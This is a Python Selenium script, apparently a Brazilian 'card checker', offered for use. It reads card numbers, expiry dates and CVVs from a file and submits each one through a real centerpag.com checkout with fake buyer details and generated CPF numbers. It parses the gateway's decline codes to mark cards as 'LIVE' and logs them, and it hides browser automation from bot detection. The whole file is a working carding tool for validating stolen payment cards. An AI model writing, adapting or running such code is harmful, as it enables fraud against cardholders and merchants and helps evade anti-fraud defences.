import time
import random
import re
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException, NoSuchElementException


chrome_options = Options()
chrome_options.add_argument("--disable-blink-features=AutomationControlled")
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option('useAutomationExtension', False)
chrome_options.add_argument("--start-maximized")
chrome_options.add_argument("--disable-infobars")
chrome_options.add_argument("--disable-popup-blocking")
chrome_options.add_argument("--disable-notifications")
chrome_options.add_argument("--lang=pt-BR")
chrome_options.add_argument("--log-level=3")
chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
chrome_options.add_argument("--disable-extensions")
chrome_options.add_argument("--disable-gpu")


LIVE_CODES = ['00', '82', '83', '84', '85', 'N7', 'FA', '100', '46', '12', '08']


def fast_type(element, text):
    element.send_keys(text)


def quick_wait(min_sec=0.2, max_sec=0.5):
    time.sleep(random.uniform(min_sec, max_sec))


def generate_cpf():
    def calculate_digit(cpf_base, factor):
        total = 0
        for digit in cpf_base:
            total += digit * factor
            factor -= 1
        remainder = total % 11
        return 0 if remainder < 2 else 11 - remainder
    
    cpf_base = [random.randint(0, 9) for _ in range(9)]
    digit1 = calculate_digit(cpf_base, 10)
    cpf_base.append(digit1)
    digit2 = calculate_digit(cpf_base, 11)
    cpf_base.append(digit2)
    
    return f"{cpf_base[0]}{cpf_base[1]}{cpf_base[2]}.{cpf_base[3]}{cpf_base[4]}{cpf_base[5]}.{cpf_base[6]}{cpf_base[7]}{cpf_base[8]}-{cpf_base[9]}{cpf_base[10]}"


def generate_email(firstname, lastname):
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{firstname.lower()}{lastname.lower()}{random.randint(10, 999)}@{random.choice(domains)}"


def process_card_in_tab(driver, card_data, card_index, total_cards):
    start_time = time.time()
    cc = ""
    mes = ""
    ano = ""
    cvv = ""
    
    try:
        
        parts = card_data.strip().split('|')
        if len(parts) < 4:
            return f"{card_data} ~> ERRO ~> Formato inválido ~>$cybersecofc"
        
        cc = parts[0].strip()
        mes = parts[1].strip().zfill(2)
        ano = parts[2].strip()
        cvv = parts[3].strip()
        ano2 = ano[-2:]
        
        
        firstnames = ['Carlos', 'Ana', 'Bruno', 'Fernanda', 'Lucas', 'Mariana']
        lastnames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Pereira']
        
        firstname = random.choice(firstnames)
        lastname = random.choice(lastnames)
        nome = f"{firstname} {lastname}"
        email = generate_email(firstname, lastname)
        phone = f"({random.randint(11, 99)}) {random.randint(90000, 99999)}-{random.randint(1000, 9999)}"
        cpf = generate_cpf()
        
        print(f"\n📌 [{card_index}/{total_cards}] {cc[:4]}****{cc[-4:]} | {mes}/{ano}")
        
        
        driver.execute_script("window.open('');")
        driver.switch_to.window(driver.window_handles[-1])
        
        
        driver.get("https://checkout.centerpag.com/pay/PPU38CPDBTJ?src=INF_69744D7FB0955&utm_source=12058")
        quick_wait(2, 3)
        
        
        try:
            name_input = WebDriverWait(driver, 8).until(
                EC.presence_of_element_located((By.NAME, "name"))
            )
            name_input.click()
            name_input.clear()
            fast_type(name_input, nome)
        except:
            pass
        
        
        try:
            email_input = driver.find_element(By.NAME, "email")
            email_input.click()
            email_input.clear()
            fast_type(email_input, email)
        except:
            pass
        
        
        try:
            email_confirm = driver.find_element(By.NAME, "emailConfirmation")
            email_confirm.click()
            email_confirm.clear()
            fast_type(email_confirm, email)
        except:
            pass
        
        
        try:
            phone_input = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.ID, "phone"))
            )
            phone_input.click()
            phone_input.clear()
            fast_type(phone_input, phone)
        except:
            pass
        
        
        try:
            driver.execute_script("document.querySelector('input[value=\"credit_card\"]').click();")
            quick_wait(0.5, 1)
        except:
            pass
        
        
        try:
            card_input = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.ID, "card-number"))
            )
            card_input.click()
            card_input.clear()
            fast_type(card_input, cc)
        except:
            pass
        
        
        try:
            month_select = Select(driver.find_element(By.ID, "card-expiration-month"))
            month_select.select_by_value(mes)
        except:
            pass
        
        
        try:
            year_select = Select(driver.find_element(By.ID, "card-expiration-year"))
            year_select.select_by_value(ano2)
        except:
            pass
        
        
        try:
            cvv_input = driver.find_element(By.NAME, "securityCode")
            cvv_input.click()
            cvv_input.clear()
            fast_type(cvv_input, cvv)
        except:
            pass
        
        
        try:
            holder_input = driver.find_element(By.NAME, "cardholderName")
            holder_input.click()
            holder_input.clear()
            fast_type(holder_input, nome.upper())
        except:
            pass
        
        
        try:
            cpf_input = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.ID, "identification-number"))
            )
            cpf_input.click()
            cpf_input.clear()
            fast_type(cpf_input, cpf)
        except:
            pass
        
        
        try:
            installment_select = Select(driver.find_element(By.NAME, "installments"))
            installment_select.select_by_value("1")
        except:
            pass
        
        
        final_url = ""
        try:
            submit_btn = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.ID, "finish-buy-btn"))
            )
            submit_btn.click()
            quick_wait(2, 3)
            
            
            time.sleep(3)
            final_url = driver.current_url
            
        except:
            try:
                submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Finalizar Compra')]")
                submit_btn.click()
                quick_wait(2, 3)
                time.sleep(3)
                final_url = driver.current_url
            except:
                pass
        
        
        page_html = driver.page_source
        page_text = page_html
        
        
        error_message = ""
        ecom_code = ""
        lr_code = ""
        
        
        error_patterns = [
            # Padrão: "Seu pagamento foi rejeitado pela administradora do cartão! Solicitação não autorizada, entre em contato com a administradora do cartão e solicite desbloqueio. ECOM 64"
            r'Seu pagamento foi rejeitado[^<]*?([^<]+?)(?:<|$)',
            r'Solicitação[^<]*?([^<]+?)(?:<|$)',
            r'pagamento[^<]*?rejeitado[^<]*?([^<]+)',
            r'<div[^>]*class="[^"]*alert[^"]*"[^>]*>(.*?)</div>',
            r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
            r'<p[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</p>',
            r'<li[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</li>',
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, page_html, re.DOTALL | re.IGNORECASE)
            if match:
                error_message = re.sub(r'<[^>]+>', '', match.group(1)).strip()
                error_message = re.sub(r'\s+', ' ', error_message)
                if error_message and len(error_message) > 5:
                    break
        
        
        ecom_match = re.search(r'ECOM\s*(\d+)', page_text, re.IGNORECASE)
        if ecom_match:
            ecom_code = ecom_match.group(1)
        
        
        lr_match = re.search(r'LR:\s*(\d+)', page_text, re.IGNORECASE)
        if lr_match:
            lr_code = lr_match.group(1)
        
        
        error_code = ""
        code_match = re.search(r'Código[:\s]+([A-Z0-9]+)', page_text, re.IGNORECASE)
        if code_match:
            error_code = code_match.group(1)
        
        
        if not error_message:
            if "rejeitado" in page_text.lower():
                error_message = "Pagamento rejeitado"
            elif "negada" in page_text.lower():
                error_message = "Transação negada"
            elif "não autorizada" in page_text.lower():
                error_message = "Transação não autorizada"
        
        elapsed_time = round(time.time() - start_time, 2)
        
        
        is_live = False
        status = "NEGADA"
        final_message = error_message
        
        
        if ecom_code in LIVE_CODES:
            is_live = True
            status = "LIVE"
            final_message = f"Aprovada (ECOM {ecom_code})"
        elif lr_code in LIVE_CODES:
            is_live = True
            status = "LIVE"
            final_message = f"Aprovada (LR {lr_code})"
        elif error_code in LIVE_CODES:
            is_live = True
            status = "LIVE"
            final_message = f"Aprovada (Código {error_code})"
        elif "sucesso" in page_text.lower() or "aprovada" in page_text.lower() or "pedido recebido" in page_text.lower():
            is_live = True
            status = "LIVE"
            final_message = "APROVADA"
        
        
        if not is_live:
            if ecom_code:
                final_message = f"Transação negada (ECOM {ecom_code})"
            elif lr_code:
                final_message = f"Transação negada (LR {lr_code})"
            elif error_code:
                final_message = f"Transação negada (Código {error_code})"
            elif not final_message:
                final_message = "Transação negada"
        
        
        result = f"{cc}|{mes}|{ano}|{cvv} ~> {status} ~> {final_message} ~>$cybersecofc ~>{elapsed_time}s"
        
        
        if is_live:
            print(f"✅ {result}")
        else:
            print(f"❌ {result}")
        
        return result
            
    except Exception as e:
        elapsed_time = round(time.time() - start_time, 2)
        result = f"{cc}|{mes}|{ano}|{cvv} ~> ERRO ~> {str(e)[:40]} ~>$cybersecofc ~>{elapsed_time}s"
        print(f"⚠️ {result}")
        return result
    
    finally:
        
        try:
            driver.close()
            driver.switch_to.window(driver.window_handles[0])
        except:
            pass


def main():
    print("\n" + "="*60)
    print("🔐 CENTERPAG.COM - AUTOMAÇÃO RÁPIDA")
    print("="*60 + "\n")
    
    
    try:
        with open('cc.txt', 'r', encoding='utf-8') as f:
            cards = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print("❌ Arquivo cc.txt não encontrado!")
        print("Crie o arquivo com o formato: numero|mes|ano|cvv")
        return
    
    if not cards:
        print("❌ Nenhum cartão encontrado!")
        return
    
    print(f"📋 Total: {len(cards)} cartões\n")
    
    
    print("🚀 Iniciando Chrome...")
    driver = webdriver.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    
    
    driver.get("about:blank")
    
    results = []
    total_start = time.time()
    
    try:
        for i, card in enumerate(cards, 1):
            result = process_card_in_tab(driver, card, i, len(cards))
            results.append(result)
            
            
            with open('resultados.txt', 'a', encoding='utf-8') as f:
                f.write(result + "\n")
            
            
            if i < len(cards):
                wait_time = random.uniform(2, 4)
                print(f"⏳ Aguardando {wait_time:.0f}s...")
                time.sleep(wait_time)
    
    except KeyboardInterrupt:
        print("\n\n⚠️ Interrompido!")
    
    finally:
        driver.quit()
    
    total_time = round(time.time() - total_start, 2)
    
    
    print("\n" + "="*60)
    print("📊 RESUMO FINAL")
    print("="*60)
    
    live = [r for r in results if 'LIVE' in r]
    negada = [r for r in results if 'NEGADA' in r]
    erro = [r for r in results if 'ERRO' in r]
    
    print(f"\n✅ LIVE/APROVADAS: {len(live)}")
    print(f"❌ NEGADAS: {len(negada)}")
    print(f"⚠️ ERROS: {len(erro)}")
    
    if live:
        print("\n🏆 APROVADOS:")
        for r in live:
            parts = r.split('|')
            if len(parts) >= 1:
                print(f"   → {parts[0]}")
    
    print(f"\n⏱️ Tempo total: {total_time}s")
    print("✅ Resultados em: resultados.txt")

if __name__ == "__main__":
    main()